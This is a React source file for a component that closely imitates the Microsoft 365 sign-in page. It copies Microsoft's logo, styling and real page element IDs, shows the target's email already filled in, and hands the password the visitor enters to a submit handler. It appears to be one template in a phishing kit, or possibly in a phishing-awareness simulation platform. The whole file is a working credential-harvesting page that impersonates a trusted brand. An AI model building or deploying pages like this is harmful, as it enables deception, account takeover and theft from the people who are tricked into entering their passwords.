'use client'

import { useState } from 'react'
import { Template, SupportedLanguage, TemplateContent } from '@/lib/templateTypes'
import { getTemplateContent } from '@/lib/templateEngine'

interface Office365TemplateProps {
  template: Template
  language: SupportedLanguage
  email: string
  onSubmit: (email: string, password: string) => void
  onError?: (error: string) => void
}

/**
 * Office365 / Microsoft Template
 * Replicates Microsoft 365 authentication interface
 */
export function Office365Template({
  template,
  language,
  email,
  onSubmit,
  onError
}: Office365TemplateProps) {
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [isSubmitting, setIsSubmitting] = useState(false)
  
  const content: TemplateContent = getTemplateContent(template, language)
  const { theme, features } = template
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!password) {
      setError(content.errorMessages.invalidPassword)
      return
    }
    
    setIsSubmitting(true)
    setError('')
    
    try {
      await onSubmit(email, password)
    } catch (err) {
      setError(content.errorMessages.serverError)
      onError?.(content.errorMessages.serverError)
    } finally {
      setIsSubmitting(false)
    }
  }
  
  return (
    <div 
      style={{
        minHeight: '100vh',
        background: '#ffffff',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
        fontFamily: '"Segoe UI", "Helvetica Neue", Arial, sans-serif',
      }}
    >
      <div
        style={{
          maxWidth: '440px',
          width: '100%',
        }}
      >
        {/* Microsoft Logo */}
        {features.showLogo && (
          <div style={{ 
            textAlign: 'center', 
            marginBottom: '24px',
          }}>
            <svg width="108" height="24" viewBox="0 0 108 24" fill="none" style={{ margin: '0 auto' }}>
              <rect width="10" height="10" fill="#F25022"/>
              <rect x="12" width="10" height="10" fill="#7FBA00"/>
              <rect y="12" width="10" height="10" fill="#00A4EF"/>
              <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
            </svg>
          </div>
        )}
        
        {/* Main Container */}
        <div style={{
          background: 'white',
          padding: '44px',
          boxShadow: '0 2px 6px rgba(0,0,0,0.2)',
          borderRadius: '4px',
        }}>
          {/* Title */}
          <h1 style={{
            fontSize: '24px',
            fontWeight: '600',
            color: '#1b1b1b',
            marginBottom: '16px',
            fontFamily: '"Segoe UI", "Helvetica Neue", sans-serif',
          }}>
            {content.title || (language === 'ja' ? 'サインイン' : 'Sign in')}
          </h1>
          
          {/* Email Display */}
          <div style={{
            padding: '12px',
            backgroundColor: '#f3f2f1',
            border: '1px solid #8a8886',
            marginBottom: '24px',
            borderRadius: '2px',
            cursor: 'pointer',
          }}>
            <div style={{ fontSize: '15px', color: '#323130' }}>
              {email}
            </div>
          </div>
          
          {/* Login Form */}
          <form id="i0281" onSubmit={handleSubmit} className="identity-signin-form">
            {/* Password Input */}
            <div style={{ marginBottom: '24px' }}>
              <label style={{
                display: 'block',
                marginBottom: '8px',
                fontSize: '14px',
                fontWeight: '500',
                color: '#323130',
              }}>
                {content.passwordLabel}
              </label>
              <input
                id="i0118"
                type="password"
                name="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder={content.passwordPlaceholder}
                autoComplete="current-password"
                disabled={isSubmitting}
                className="identity-textbox"
                style={{
                  width: '100%',
                  padding: '10px',
                  fontSize: '15px',
                  border: '1px solid #8a8886',
                  borderRadius: '2px',
                  fontFamily: '"Segoe UI", "Helvetica Neue", sans-serif',
                  boxSizing: 'border-box',
                }}
              />
            </div>
            
            {/* Error Message */}
            {error && (
              <div id="passwordError" style={{
                color: '#a4262c',
                fontSize: '13px',
                marginBottom: '16px',
              }}>
                {error}
              </div>
            )}
            
            {/* Submit Button */}
            <button
              id="idSIButton9"
              type="submit"
              disabled={isSubmitting || !password}
              className="sign-in-button"
              style={{
                width: '100%',
                padding: '10px',
                backgroundColor: isSubmitting || !password ? '#8a8886' : '#0067b8',
                color: '#ffffff',
                border: 'none',
                borderRadius: '2px',
                fontSize: '15px',
                fontWeight: '600',
                cursor: isSubmitting || !password ? 'not-allowed' : 'pointer',
                fontFamily: '"Segoe UI", "Helvetica Neue", sans-serif',
                transition: 'background-color 0.2s',
              }}
            >
              {isSubmitting ? '...' : content.submitButton || (language === 'ja' ? 'サインイン' : 'Sign in')}
            </button>
          </form>
        </div>
      </div>
    </div>
  )
}

export default Office365Template








